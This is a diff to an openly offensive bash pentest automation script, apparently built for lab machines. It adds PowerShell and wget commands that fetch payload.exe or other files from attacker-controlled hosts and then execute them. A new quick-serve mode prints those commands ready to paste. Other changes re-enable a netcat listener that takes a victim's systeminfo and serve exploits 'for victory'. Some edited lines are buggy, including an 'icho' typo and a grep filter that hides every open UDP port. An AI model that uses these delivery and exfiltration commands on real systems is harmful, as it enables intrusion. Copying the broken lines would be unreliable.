@@ -100,7 +100,14 @@ function cheatsheet
   echo "unicornscan ${target}:1-4000 ${target}:a -m [tcp,U]"
   echo ""
 
-  powershell.exe -Command "& { Invoke-WebRequest 'http://10.10.15.207:8888/payload.exe' -OutFile 'payload.exe'}"
+  echo_green "download file using powershell (3.0)+"
+  echo "powershell.exe -Command \"& { Invoke-WebRequest 'http://10.10.15.207:8888/payload.exe' -OutFile 'payload.exe'}\""
+  echo ""
+
+  echo_green "download file using powershell (2.0)"
+  echo "powershell -NoLogo -Command \"\$webClient = new-object System.Net.WebClient; \$webClient.DownloadFile('http://10.10.16.10:80/vdmallowed.exe', 'vdmallowed.exe')\""
+  icho "powershell -NoLogo -Command \"\$webClient = new-object System.Net.WebClient; \$webClient.DownloadFile('http://10.10.16.10:80/vdmallowed.exe', 'vdmallowed.exe')\""
+  echo ""
 
     
 }
@@ -138,7 +145,7 @@ function print_download_links
     decho_green "most useful payloads..."
     decho_green "run command below on victim for auto-enumerate, auto-exploit suggest and send output to attacker..."
     echo "cd /dev/shm && source <(${client} -s http://${local_ip}:${web_port}/autopwn.sh)"
-    categories=( "enumeration" "privilege-escalation" "exploits" )
+    categories=( "enumeration" "privilege-escalation" "exploits" "common" "static-binaries")
     for category in ${categories[@]}
     do
       decho_red "category: ${category}"
@@ -161,6 +168,7 @@ function print_download_links
         elif [[ ${type} == "windows" ]]
         then
           echo "powershell.exe -Command \"& { Invoke-WebRequest 'http://${local_ip}:${web_port}/${filename#./}' -OutFile '${file}'}\""
+          echo "powershell -NoLogo -Command \"\$webClient = new-object System.Net.WebClient; \$webClient.DownloadFile('http://${local_ip}:${web_port}/${filename#./}', '${file}')\""
         fi
       done
     done
@@ -176,6 +184,7 @@ function help
     decho "or... --enumerate - this will run standalone enumeration on linux box and print output"
     decho "or... --cheatsheet [target] - this will print cheatsheet with common tools/examples, add hostname to input target address/hostname"
     decho "or... --web-proxy <target> <port> - this will run socat and let you access website over your hacking box port ${proxy_port}"
+    decho "or... --quick-serve - runs local http server on ${web_port}, prints links to download files in current directory with powershell"
     decho "or... --http-server [download client] - runs simple http server, shows ready to copy & paste commands to run all kinds of scripts, enumeration, post-exploitation etc. using chosen client on target (wget by default)"
     decho "or... --windows-exploit-suggest <target workspace directory> - runs simple http server, serves nc.exe to automate pass of systeminfo to local windows-exploit-suggester, runs it, makes suggestion on reliable exploits"
     decho "missing parameters, hostname or filename with hostnames required" 
@@ -186,8 +195,9 @@ function help
   then
     decho "usage: ${0} [--help/-h] <hostname/ip>"
     decho "or... --enumerate - this will run standalone enumeration on linux box and print output"
-    decho "or... --cheatsheet [target]- this will print cheatsheet with common tools/examples, add hostname to input target address/hostname"
-    decho "or... --web-proxy <target> <port>- this will run socat and let you access website over your hacking box port ${proxy_port}"
+    decho "or... --cheatsheet [target] - this will print cheatsheet with common tools/examples, add hostname to input target address/hostname"
+    decho "or... --web-proxy <target> <port> - this will run socat and let you access website over your hacking box port ${proxy_port}"
+    decho "or... --quick-serve - runs local http server on ${web_port}, prints links to download files in current directory with powershell"
     decho "or... --http-server <download client> - runs simple http server, shows ready to copy & paste commands to run all kinds of scripts, enumeration, post-exploitation etc. using chosen client on target (wget by default)"
     decho "or... --windows-exploit-suggest <target workspace directory> - runs simple http server, serves nc.exe to automate pass of systeminfo to local windows-exploit-suggester, runs it, makes suggestion on reliable exploits"
     exit 0
@@ -215,10 +225,10 @@ function help
     # serve static netcat.exe
     cd ${repository_root}/static-binaries/windows/x86
 
-    #python -m SimpleHTTPServer ${web_port} &
+    python -m SimpleHTTPServer ${web_port} &
 
     cd ${target}
-    #nc -lnvp 9876 > systeminfo.log &
+    nc -lnvp 9876 > systeminfo.log &
 
     sleep 2
     decho_green "download netcat to host, set up local netcat listener to accept input from systeminfo, feed it to windows-exploit-suggester!"
@@ -226,8 +236,8 @@ function help
     echo "set PATH=%PATH%;%CD% && powershell.exe -Command \"systeminfo | nc.exe 10.10.16.10 9876\""
     echo "powershell.exe -Command \"systeminfo | nc ${local_ip} 9876\""
     decho "closing in 90 seconds..."
-    #sleep 90
-    #ps aux | grep SimpleHTTPServer | grep -v grep | awk ' { print $2 } ' | xargs kill &>/dev/null
+    sleep 90
+    ps aux | grep SimpleHTTPServer | grep -v grep | awk ' { print $2 } ' | xargs kill &>/dev/null
 
     decho "done serving, analyze result..."
     # choose newest database
@@ -240,11 +250,11 @@ function help
     then
       decho_green "seems like found possible reliable exploit... serving exploit over http, download it and execute for victory!"
       cd ${repository_root}/exploits/windows
-      #python -m SimpleHTTPServer ${web_port} &
+      python -m SimpleHTTPServer ${web_port} &
       sleep 2
       echo "powershell.exe -Command \"& { Invoke-WebRequest 'http://${local_ip}:${web_port}/${exploit_name}.exe' -OutFile '${exploit_name}.exe'\" && ${exploit_name}.exe"
       decho "closing in 90 seconds..."
-      sleep 1
+      sleep 90
       ps aux | grep SimpleHTTPServer | grep -v grep | awk ' { print $2 } ' | xargs kill &>/dev/null
     fi
     cd ${current_dir}
@@ -258,6 +268,50 @@ function help
     local_ip=$( ip -f inet -o addr show ${web_iface} | cut -d\  -f 7 | cut -d/ -f 1 )
     decho_green "serving on ${local_ip} on port ${proxy_port}, access via: http://${local_ip}:${proxy_port}/ - press ctrl+c to stop it"
     socat TCP-LISTEN:${proxy_port},fork TCP:${option_2}:${option_3}
+    exit 0
+  fi
+
+  if [[ "${mode}" == "--quick-serve"  ]]
+  then
+    # load config for repository root
+    source ${config_path}
+    decho_green "opening portal..."
+    local_ip=$( ip -f inet -o addr show ${iface} | cut -d\  -f 7 | cut -d/ -f 1 )
+    current_dir=$( pwd )
+    client=${option_2}
+    if [[ -z ${client} ]]
+    then
+      client="wget"
+    fi
+    python -m SimpleHTTPServer ${web_port} &
+
+    for filename in $( find -L . -type f )
+    do
+      type=$( check_type ${filename} )
+      file=$( basename ${filename} )
+      if [[ ${type} == "bash" ]] || [[ ${type} == "elf" ]]
+      then
+        echo "cd /dev/shm && ${client} http://${local_ip}:${web_port}/${filename#./} && chmod +x ${file} && ./${file}"
+      elif [[ ${type} == "python" ]]
+      then
+        echo "cd /dev/shm && ${client} http://${local_ip}:${web_port}/${filename#./} && python ${file}"
+      elif [[ ${type} == "perl" ]]
+      then
+        echo "cd /dev/shm && ${client} http://${local_ip}:${web_port}/${filename#./} && perl ${file}"
+      elif [[ ${type} == "c" ]]
+      then
+        echo "cd /dev/shm && ${client} http://${local_ip}:${web_port}/${filename#./} && gcc ${file} -o ${file}.out && chmod +x ${file}.out && ./${file}.out"
+      elif [[ ${type} == "windows" ]]
+      then
+        echo "powershell.exe -Command \"& { Invoke-WebRequest 'http://${local_ip}:${web_port}/${filename#./}' -OutFile '${file}'}\""
+      fi
+    done
+
+    sleep 2
+    echo "closing in 60 seconds..."
+    sleep 60
+    cd ${current_dir}
+    ps aux | grep SimpleHTTPServer | grep -v grep | awk ' { print $2 } ' | xargs kill &>/dev/null
     exit 0
   fi
 
@@ -377,9 +431,14 @@ function web_scanners
   gobuster_logs="${logs_path}/${target}/gobuster"
   mkdir -p "${gobuster_logs}"
 
+  whatweb_logs="${logs_path}/${target}/whatweb"
+  mkdir -p "${whatweb_logs}"
+
 
   if [[ ${port} -eq 80 ]]
   then
+    decho "running whatweb on ${target}/${port}..."
+    whatweb http://${target}:${port}/ | tee ${whatweb_logs}/${target}.tcp.${port}.whatweb
 
     nikto -port ${port} -host http://${target}/ &> ${nikto_logs}/${target}.tcp.${port}.nikto &
     long_jobs_pids+=(${!})
@@ -388,10 +447,14 @@ function web_scanners
     gobuster -k -w ${gobuster_wordlist} -u http://${target}:${port}/ -r -t 200 &> ${gobuster_logs}/${target}.tcp.${port}.gobuster &
     long_jobs_pids+=(${!})
     decho "running gobuster on ${target}/${port} in background..."
+
     
     check_wp "http://${target}:${port}/"
   elif [[ ${port} -eq 443 ]]
   then
+    decho "running whatweb on ${target}/${port}..."
+    whatweb https://${target}:${port}/ | tee ${whatweb_logs}/${target}.tcp.${port}.whatweb
+
     nikto -port ${port} -host https://${target}/ &> ${nikto_logs}/${target}.tcp.${port}.nikto &
     long_jobs_pids+=(${!})
     decho "running nikto on ${target}/${port} in background..."
@@ -402,6 +465,9 @@ function web_scanners
 
     check_wp "https://${target}:${port}/"
   else
+    decho "running whatweb on ${target}/${port}..."
+    whatweb http://${target}:${port}/ | tee ${whatweb_logs}/${target}.tcp.${port}.whatweb
+
     nikto -port ${port} -host http://${target}/ &> ${nikto_logs}/${target}.tcp.${port}.nikto &
     long_jobs_pids+=(${!})
     decho "running nikto on ${target}/${port} in background..."
@@ -546,7 +612,7 @@ function initial_scan_nmap
   udp_ports_count=$( cat ${nmap_logs}/${target}.udp.nmap.quick.log | grep -v "Not shown" | grep open | wc -l )
   if [[ ${udp_ports_count} -ne 0 ]]
   then
-    cat ${nmap_logs}/${target}.udp.nmap.quick.log | grep -v "Not shown" |  grep open | awk -v date="$(date +"%H:%M:%S")" ' { print "\033[32m[" date "] found open port " $1 " for service " $3  "\033[0m" } '
+    cat ${nmap_logs}/${target}.udp.nmap.quick.log | grep -v "Not shown" | grep -v "open\|filtered" |  grep open | awk -v date="$(date +"%H:%M:%S")" ' { print "\033[32m[" date "] found open port " $1 " for service " $3  "\033[0m" } '
   else
     decho_red "no open udp ports found!"
     no_udp=1
